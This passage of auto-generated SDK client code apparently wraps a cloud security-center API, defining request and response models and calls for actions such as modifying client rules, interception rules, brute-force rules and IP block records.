    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClientConfSetup(request: ModifyClientConfSetupRequest): ModifyClientConfSetupResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientConfSetupWithOptions(request, runtime);
}

model ModifyClientConfStrategyRequest {
  tag?: string(name='Tag'),
  tagExt?: string(name='TagExt'),
  tagValue?: string(name='TagValue'),
  uuid?: string(name='Uuid'),
  uuids?: [ string ](name='Uuids'),
}

model ModifyClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyClientConfStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientConfStrategyResponseBody(name='body'),
}

async function modifyClientConfStrategyWithOptions(request: ModifyClientConfStrategyRequest, runtime: Util.RuntimeOptions): ModifyClientConfStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.tagExt)) {
    query['TagExt'] = request.tagExt;
  }
  if (!Util.isUnset(request.tagValue)) {
    query['TagValue'] = request.tagValue;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientConfStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClientConfStrategy(request: ModifyClientConfStrategyRequest): ModifyClientConfStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientConfStrategyWithOptions(request, runtime);
}

model ModifyClientUserDefineRuleRequest {
  actionType?: int32(name='ActionType'),
  cmdline?: string(name='Cmdline'),
  filePath?: string(name='FilePath'),
  IP?: string(name='IP'),
  id?: long(name='Id'),
  md5List?: string(name='Md5List'),
  name?: string(name='Name'),
  newFilePath?: string(name='NewFilePath'),
  parentCmdline?: string(name='ParentCmdline'),
  parentProcPath?: string(name='ParentProcPath'),
  platform?: string(name='Platform'),
  port?: int32(name='Port'),
  portStr?: string(name='PortStr'),
  procPath?: string(name='ProcPath'),
  registryContent?: string(name='RegistryContent'),
  registryKey?: string(name='RegistryKey'),
  type?: int32(name='Type'),
}

model ModifyClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientUserDefineRuleResponseBody(name='body'),
}

async function modifyClientUserDefineRuleWithOptions(request: ModifyClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): ModifyClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.actionType)) {
    query['ActionType'] = request.actionType;
  }
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.filePath)) {
    query['FilePath'] = request.filePath;
  }
  if (!Util.isUnset(request.IP)) {
    query['IP'] = request.IP;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.md5List)) {
    query['Md5List'] = request.md5List;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.newFilePath)) {
    query['NewFilePath'] = request.newFilePath;
  }
  if (!Util.isUnset(request.parentCmdline)) {
    query['ParentCmdline'] = request.parentCmdline;
  }
  if (!Util.isUnset(request.parentProcPath)) {
    query['ParentProcPath'] = request.parentProcPath;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.portStr)) {
    query['PortStr'] = request.portStr;
  }
  if (!Util.isUnset(request.procPath)) {
    query['ProcPath'] = request.procPath;
  }
  if (!Util.isUnset(request.registryContent)) {
    query['RegistryContent'] = request.registryContent;
  }
  if (!Util.isUnset(request.registryKey)) {
    query['RegistryKey'] = request.registryKey;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClientUserDefineRule(request: ModifyClientUserDefineRuleRequest): ModifyClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientUserDefineRuleWithOptions(request, runtime);
}

model ModifyClusterCnnfStatusUserConfirmRequest {
  clusterIds?: [ string ](name='ClusterIds'),
  userConfirm?: boolean(name='UserConfirm'),
}

model ModifyClusterCnnfStatusUserConfirmResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyClusterCnnfStatusUserConfirmResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClusterCnnfStatusUserConfirmResponseBody(name='body'),
}

async function modifyClusterCnnfStatusUserConfirmWithOptions(request: ModifyClusterCnnfStatusUserConfirmRequest, runtime: Util.RuntimeOptions): ModifyClusterCnnfStatusUserConfirmResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  if (!Util.isUnset(request.userConfirm)) {
    query['UserConfirm'] = request.userConfirm;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClusterCnnfStatusUserConfirm',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClusterCnnfStatusUserConfirm(request: ModifyClusterCnnfStatusUserConfirmRequest): ModifyClusterCnnfStatusUserConfirmResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClusterCnnfStatusUserConfirmWithOptions(request, runtime);
}

model ModifyConcernNecessityRequest {
  concernNecessity?: string(name='ConcernNecessity'),
}

model ModifyConcernNecessityResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyConcernNecessityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyConcernNecessityResponseBody(name='body'),
}

async function modifyConcernNecessityWithOptions(request: ModifyConcernNecessityRequest, runtime: Util.RuntimeOptions): ModifyConcernNecessityResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.concernNecessity)) {
    query['ConcernNecessity'] = request.concernNecessity;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyConcernNecessity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyConcernNecessity(request: ModifyConcernNecessityRequest): ModifyConcernNecessityResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyConcernNecessityWithOptions(request, runtime);
}

model ModifyCreateVulWhitelistRequest {
  reason?: string(name='Reason'),
  targetInfo?: string(name='TargetInfo'),
  whitelist?: string(name='Whitelist'),
}

model ModifyCreateVulWhitelistResponseBody = {
  requestId?: string(name='RequestId'),
  vulWhitelistList?: [ 
    {
      id?: long(name='Id'),
    }
  ](name='VulWhitelistList'),
}

model ModifyCreateVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCreateVulWhitelistResponseBody(name='body'),
}

async function modifyCreateVulWhitelistWithOptions(request: ModifyCreateVulWhitelistRequest, runtime: Util.RuntimeOptions): ModifyCreateVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  if (!Util.isUnset(request.whitelist)) {
    query['Whitelist'] = request.whitelist;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCreateVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyCreateVulWhitelist(request: ModifyCreateVulWhitelistRequest): ModifyCreateVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCreateVulWhitelistWithOptions(request, runtime);
}

model ModifyCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp'),
  bound?: string(name='Bound'),
  expireTime?: long(name='ExpireTime'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuids?: string(name='Uuids'),
}

model ModifyCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCustomBlockRecordResponseBody(name='body'),
}

async function modifyCustomBlockRecordWithOptions(request: ModifyCustomBlockRecordRequest, runtime: Util.RuntimeOptions): ModifyCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.expireTime)) {
    query['ExpireTime'] = request.expireTime;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyCustomBlockRecord(request: ModifyCustomBlockRecordRequest): ModifyCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCustomBlockRecordWithOptions(request, runtime);
}

model ModifyCycleTaskRequest {
  configId?: string(name='ConfigId'),
  enable?: int32(name='Enable'),
  firstDateStr?: long(name='FirstDateStr'),
  intervalPeriod?: int32(name='IntervalPeriod'),
  param?: string(name='Param'),
  periodUnit?: string(name='PeriodUnit'),
  targetEndTime?: int32(name='TargetEndTime'),
  targetStartTime?: int32(name='TargetStartTime'),
  taskName?: string(name='TaskName'),
  taskType?: string(name='TaskType'),
}

model ModifyCycleTaskResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCycleTaskResponseBody(name='body'),
}

async function modifyCycleTaskWithOptions(request: ModifyCycleTaskRequest, runtime: Util.RuntimeOptions): ModifyCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.firstDateStr)) {
    query['FirstDateStr'] = request.firstDateStr;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.targetEndTime)) {
    query['TargetEndTime'] = request.targetEndTime;
  }
  if (!Util.isUnset(request.targetStartTime)) {
    query['TargetStartTime'] = request.targetStartTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyCycleTask(request: ModifyCycleTaskRequest): ModifyCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCycleTaskWithOptions(request, runtime);
}

model ModifyEmgVulSubmitRequest {
  lang?: string(name='Lang'),
  name?: string(name='Name'),
  userAgreement?: string(name='UserAgreement'),
}

model ModifyEmgVulSubmitResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyEmgVulSubmitResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyEmgVulSubmitResponseBody(name='body'),
}

async function modifyEmgVulSubmitWithOptions(request: ModifyEmgVulSubmitRequest, runtime: Util.RuntimeOptions): ModifyEmgVulSubmitResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.userAgreement)) {
    query['UserAgreement'] = request.userAgreement;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyEmgVulSubmit',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyEmgVulSubmit(request: ModifyEmgVulSubmitRequest): ModifyEmgVulSubmitResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyEmgVulSubmitWithOptions(request, runtime);
}

model ModifyGroupPropertyRequest {
  data?: string(name='Data'),
}

model ModifyGroupPropertyResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyGroupPropertyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyGroupPropertyResponseBody(name='body'),
}

async function modifyGroupPropertyWithOptions(request: ModifyGroupPropertyRequest, runtime: Util.RuntimeOptions): ModifyGroupPropertyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.data)) {
    query['Data'] = request.data;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyGroupProperty',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyGroupProperty(request: ModifyGroupPropertyRequest): ModifyGroupPropertyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyGroupPropertyWithOptions(request, runtime);
}

model ModifyInstanceAntiBruteForceRuleRequest {
  newRuleId?: long(name='NewRuleId'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model ModifyInstanceAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyInstanceAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInstanceAntiBruteForceRuleResponseBody(name='body'),
}

async function modifyInstanceAntiBruteForceRuleWithOptions(request: ModifyInstanceAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): ModifyInstanceAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.newRuleId)) {
    query['NewRuleId'] = request.newRuleId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInstanceAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyInstanceAntiBruteForceRule(request: ModifyInstanceAntiBruteForceRuleRequest): ModifyInstanceAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInstanceAntiBruteForceRuleWithOptions(request, runtime);
}

model ModifyInterceptionRuleRequest {
  clusterId?: string(name='ClusterId'),
  dstTarget?: map[string]any(name='DstTarget'),
  interceptType?: int32(name='InterceptType'),
  orderIndex?: long(name='OrderIndex'),
  ruleId?: long(name='RuleId'),
  ruleName?: string(name='RuleName'),
  ruleSwitch?: int32(name='RuleSwitch'),
  srcTarget?: map[string]any(name='SrcTarget'),
}

model ModifyInterceptionRuleShrinkRequest {
  clusterId?: string(name='ClusterId'),
  dstTargetShrink?: string(name='DstTarget'),
  interceptType?: int32(name='InterceptType'),
  orderIndex?: long(name='OrderIndex'),
  ruleId?: long(name='RuleId'),
  ruleName?: string(name='RuleName'),
  ruleSwitch?: int32(name='RuleSwitch'),
  srcTargetShrink?: string(name='SrcTarget'),
}

model ModifyInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInterceptionRuleResponseBody(name='body'),
}

async function modifyInterceptionRuleWithOptions(tmpReq: ModifyInterceptionRuleRequest, runtime: Util.RuntimeOptions): ModifyInterceptionRuleResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyInterceptionRuleShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstTarget)) {
    request.dstTargetShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstTarget, 'DstTarget', 'json');
  }
  if (!Util.isUnset(tmpReq.srcTarget)) {
    request.srcTargetShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcTarget, 'SrcTarget', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.dstTargetShrink)) {
    query['DstTarget'] = request.dstTargetShrink;
  }
  if (!Util.isUnset(request.interceptType)) {
    query['InterceptType'] = request.interceptType;
  }
  if (!Util.isUnset(request.orderIndex)) {
    query['OrderIndex'] = request.orderIndex;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  if (!Util.isUnset(request.srcTargetShrink)) {
    query['SrcTarget'] = request.srcTargetShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyInterceptionRule(request: ModifyInterceptionRuleRequest): ModifyInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInterceptionRuleWithOptions(request, runtime);
}

model ModifyInterceptionRuleSwitchRequest {
  clusterId?: string(name='ClusterId'),
  ruleIds?: string(name='RuleIds'),
  ruleSwitch?: int32(name='RuleSwitch'),
}

model ModifyInterceptionRuleSwitchResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyInterceptionRuleSwitchResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInterceptionRuleSwitchResponseBody(name='body'),
}

async function modifyInterceptionRuleSwitchWithOptions(request: ModifyInterceptionRuleSwitchRequest, runtime: Util.RuntimeOptions): ModifyInterceptionRuleSwitchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleIds)) {
    query['RuleIds'] = request.ruleIds;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInterceptionRuleSwitch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyInterceptionRuleSwitch(request: ModifyInterceptionRuleSwitchRequest): ModifyInterceptionRuleSwitchResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInterceptionRuleSwitchWithOptions(request, runtime);
}

model ModifyInterceptionTargetRequest {
  appName?: string(name='AppName'),
  imageList?: [ string ](name='ImageList'),
  namespace?: string(name='Namespace'),
  tagList?: [ string ](name='TagList'),
  targetId?: long(name='TargetId'),
  targetName?: string(name='TargetName'),
  targetType?: string(name='TargetType'),
}

model ModifyInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId'),
  result?: boolean(name='Result'),
}

model ModifyInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInterceptionTargetResponseBody(name='body'),
}

async function modifyInterceptionTargetWithOptions(request: ModifyInterceptionTargetRequest, runtime: Util.RuntimeOptions): ModifyInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.imageList)) {
    query['ImageList'] = request.imageList;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.targetId)) {
    query['TargetId'] = request.targetId;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyInterceptionTarget(request: ModifyInterceptionTargetRequest): ModifyInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInterceptionTargetWithOptions(request, runtime);
}

model ModifyLogMetaStatusRequest {
  from?: string(name='From'),
  logStore?: string(name='LogStore'),
  project?: string(name='Project'),
  status?: string(name='Status'),
}

model ModifyLogMetaStatusResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyLogMetaStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLogMetaStatusResponseBody(name='body'),
}

async function modifyLogMetaStatusWithOptions(request: ModifyLogMetaStatusRequest, runtime: Util.RuntimeOptions): ModifyLogMetaStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.logStore)) {
    query['LogStore'] = request.logStore;
  }
  if (!Util.isUnset(request.project)) {
    query['Project'] = request.project;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLogMetaStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyLogMetaStatus(request: ModifyLogMetaStatusRequest): ModifyLogMetaStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLogMetaStatusWithOptions(request, runtime);
}

model ModifyLoginBaseConfigRequest {
  config?: string(name='Config'),
  target?: string(name='Target'),
  type?: string(name='Type'),
}

model ModifyLoginBaseConfigResponseBody = {
  code?: string(name='Code'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ModifyLoginBaseConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLoginBaseConfigResponseBody(name='body'),
}

async function modifyLoginBaseConfigWithOptions(request: ModifyLoginBaseConfigRequest, runtime: Util.RuntimeOptions): ModifyLoginBaseConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLoginBaseConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyLoginBaseConfig(request: ModifyLoginBaseConfigRequest): ModifyLoginBaseConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLoginBaseConfigWithOptions(request, runtime);
}

model ModifyLoginSwitchConfigRequest {
  item?: string(name='Item'),
  status?: int32(name='Status'),
}

model ModifyLoginSwitchConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyLoginSwitchConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLoginSwitchConfigResponseBody(name='body'),
}

async function modifyLoginSwitchConfigWithOptions(request: ModifyLoginSwitchConfigRequest, runtime: Util.RuntimeOptions): ModifyLoginSwitchConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.item)) {
    query['Item'] = request.item;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLoginSwitchConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyLoginSwitchConfig(request: ModifyLoginSwitchConfigRequest): ModifyLoginSwitchConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLoginSwitchConfigWithOptions(request, runtime);
}

model ModifyNoticeConfigRequest {
  project?: string(name='Project'),
  route?: int32(name='Route'),
  sourceIp?: string(name='SourceIp'),
  timeLimit?: int32(name='TimeLimit'),
}

model ModifyNoticeConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyNoticeConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyNoticeConfigResponseBody(name='body'),
}

async function modifyNoticeConfigWithOptions(request: ModifyNoticeConfigRequest, runtime: Util.RuntimeOptions): ModifyNoticeConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.project)) {
    query['Project'] = request.project;
  }
  if (!Util.isUnset(request.route)) {
    query['Route'] = request.route;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.timeLimit)) {
    query['TimeLimit'] = request.timeLimit;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyNoticeConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyNoticeConfig(request: ModifyNoticeConfigRequest): ModifyNoticeConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyNoticeConfigWithOptions(request, runtime);
}

model ModifyOpenLogShipperRequest {
  from?: string(name='From'),
}

model ModifyOpenLogShipperResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyOpenLogShipperResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyOpenLogShipperResponseBody(name='body'),
}

async function modifyOpenLogShipperWithOptions(request: ModifyOpenLogShipperRequest, runtime: Util.RuntimeOptions): ModifyOpenLogShipperResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
